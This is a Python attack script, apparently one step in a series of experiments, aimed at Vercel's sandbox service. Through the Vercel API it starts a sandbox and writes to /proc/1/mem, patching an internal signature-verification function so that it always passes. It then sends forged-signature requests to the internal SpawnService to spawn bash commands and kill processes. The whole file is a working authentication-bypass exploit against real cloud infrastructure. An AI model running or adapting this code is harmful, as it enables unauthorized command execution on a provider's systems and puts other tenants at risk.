# 实验J196: patch verify函数绕过签名验证 -> 免签调用SpawnService!
# j194/195: internal/auth.(*Verifier).verify @0x83b3a0 返回error(nil=通过)
#           patch开头5字节为 31 c0 c3 66 90 (xor eax,eax; ret; nop) => 恒nil
# 本步: 1)patch内存 2)Ping测试(CPV+假签名+时间戳) 3)Spawn任意命令
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=26000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj196"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time, socket, struct
out = open("/tmp/d196.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")

# PA: patch verify @0x83b3a0 -> 31 c0 c3 66 90
p("CP", "PA")
ADDR = 0x83b3a0
fd = os.open("/proc/1/mem", os.O_RDWR)
os.lseek(fd, ADDR, 0)
orig = os.read(fd, 5)
p("ORIG", orig.hex())
patch = bytes([0x31, 0xc0, 0xc3, 0x66, 0x90])
os.lseek(fd, ADDR, 0)
nw = os.write(fd, patch)
os.lseek(fd, ADDR, 0)
after = os.read(fd, 5)
p("PATCHED", "wrote", nw, "read", after.hex())
os.close(fd)
p("PA_DONE")
out.flush()

# PB: Ping 测试 (CPV + 假签名 + 真时间戳)
p("CP", "PB")
def http(port, method, path, headers, body=b"", to=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(to)
        s.connect(("127.0.0.1", port))
        hdrs = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        for k, v in headers.items():
            hdrs += f"{k}: {v}\r\n"
        hdrs += f"Content-Length: {len(body)}\r\n\r\n"
        s.send(hdrs.encode() + body)
        d = b""
        try:
            while True:
                b = s.recv(4096)
                if not b:
                    break
                d += b
                if len(d) > 4000:
                    break
        except Exception:
            pass
        s.close()
        return d
    except Exception as ex:
        return ("EXC:" + repr(ex)).encode()
now = str(int(time.time()))
PING = "/vercel.sandbox.spawn.v1.SpawnService/Ping"
d = http(30001, "POST", PING,
         {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1",
          "signature": "AAAA", "timestamp": now}, b"{}")
p("PING_RESP", d[:1500])
out.flush()

# PC: Spawn 测试 (若Ping有响应)
p("CP", "PC")
SPAWN = "/vercel.sandbox.spawn.v1.SpawnService/Spawn"
body = json.dumps({"command": "bash",
                   "arguments": ["-c", "id; hostname; cat /etc/hostname; ls -la /"],
                   "environment": {}, "workingDirectory": "/"}).encode()
d = http(30001, "POST", SPAWN,
         {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1",
          "signature": "AAAA", "timestamp": now}, body)
p("SPAWN_RESP", d[:2500])
out.flush()

# PD: Kill 测试
p("CP", "PD")
KILL = "/vercel.sandbox.spawn.v1.SpawnService/Kill"
d = http(30001, "POST", KILL,
         {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1",
          "signature": "AAAA", "timestamp": now}, b"{}")
p("KILL_RESP", d[:1000])
out.flush()
p("done")
out.close()
'''

st = run_cmd(sid, CODE, "J196", timeout=290)
time.sleep(2)
bashfile(sid, "cat /tmp/d196.txt", "marker", 16000)
if st == "DEAD":
    print("\n!!! DEATH -> trigger located in marker above", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
